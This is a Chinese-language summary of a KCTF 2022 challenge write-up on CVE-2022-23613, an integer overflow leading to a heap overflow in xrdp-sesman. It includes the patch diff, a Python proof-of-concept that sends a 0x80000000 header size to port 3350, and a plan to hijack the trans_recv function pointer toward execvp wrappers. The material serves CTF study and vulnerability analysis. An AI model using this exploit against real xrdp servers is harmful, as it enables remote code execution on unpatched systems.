---
title: 看雪2022 KCTF 秋季赛 | 第七题设计思路及解析
contest: 看雪2022 KCTF秋季赛
year: 2022
difficulty: hard
vuln_type: heap_exploit
tags: [CVE-2022-23613, xrdp-sesman整数溢出, trans_recv堆溢出, 函数指针劫持, execvp, g_execlp3, 堆喷]
attack_chain: CVE-2022-23613整数溢出→size=0x80000000触发trans_recv堆溢出→覆盖self->trans_recv函数指针→调用g_execvp("sh", args)或g_execlp3
key_payload: "CVE-2022-23613 xrdp-sesman;header_size=0x80000000整数溢出;trans结构体trans_recv函数指针;g_execvp=0x4105D8;g_execlp3=0x410658;POC:sdata+=struct.pack('>I',0x80000000)"
one_liner: KCTF2022秋Q7《广厦万间》：CVE-2022-23613 xrdp-sesman整数溢出堆溢出+trans_recv函数指针劫持
lesson: header_size负数校验缺失导致整数溢出堆溢出；堆结构体函数指针劫持是经典pwn利用
quality: high
---

# 看雪2022 KCTF 秋季赛 | 第七题设计思路及解析

**赛事**：看雪2022 KCTF秋季赛 Q7《广厦万间》

**难度**：仅3队提交flag

**漏洞**：CVE-2022-23613（xrdp-sesman 0.9.18 整数溢出）

**Patch修复**：
```diff
+ #define HEADER_SIZE 8
- if (size > self->in_s->size)
+ if (size < HEADER_SIZE || size > self->in_s->size)
- self->header_size = 8;
+ self->header_size = HEADER_SIZE;
```
- 添加对size的负数校验（整数溢出）
- header_size宏化

**漏洞成因**：
- 缓冲区：`g_malloc(in_size, 0)` 创建0x2000大小（每次新连接）
- 读取：`to_read = header_size - read_so_far`
- 若 `header_size = 0x80000000`（负数）→ `to_read = 负数 - 正数` → 极大正数
- 触发 `trans_recv` 堆溢出

**POC**：
```python
import socket
import struct
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 3350))
sdata = b''
sdata += struct.pack("I", 0x2222CCCC)  # version
sdata += struct.pack(">I", 0x80000000)  # headersize
s.send(sdata)
sdata = b'a' * 0x10000  # padding
s.send(sdata)
```

**利用思路**：
- trans结构体与输入输出缓冲区都在堆上
- 覆盖 `self->trans_recv` 函数指针
- IDA搜索：
  - `g_execvp = 0x4105D8`（execvp包装）
  - `g_execlp3 = 0x410658`（execlp包装）

**两种稳定利用方案**：
1. **堆喷方案**：2个连接创建0x100000~0xff00000堆空间
2. **非堆喷方案**：稳定控制 execvp / execlp 参数（不需地址碰撞）

**两种方案都只需5-10个连接即可稳定利用**（取决于EXP精细度）

**关键点**：
- 出题人未删除符号表（PWN FOR FUN原则）
- 借鉴了CVE-2022-23613漏洞分析文章
- 题源：xrdp-sesman协议服务端整数溢出堆溢出

**质量评估**：高（CVE引用 + POC + 两种利用方案 + 函数指针地址）
